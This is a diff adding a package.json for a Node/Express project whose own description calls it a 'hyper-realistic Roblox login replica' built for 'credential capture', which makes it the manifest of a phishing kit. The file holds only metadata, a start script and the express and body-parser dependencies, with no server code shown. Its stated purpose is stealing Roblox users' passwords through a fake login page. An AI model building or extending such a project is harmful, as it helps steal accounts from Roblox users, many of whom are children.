@@ -1,0 +1,16 @@
+{
+  "name": "roblox-login-server",
+  "version": "1.0.0",
+  "description": "Hyper-realistic Roblox login replica with Express server for credential capture",
+  "main": "server.js",
+  "scripts": {
+    "start": "node server.js"
+  },
+  "dependencies": {
+    "express": "^4.19.2",
+    "body-parser": "^1.20.3"
+  },
+  "engines": {
+    "node": ">=18.0.0"
+  }
+}
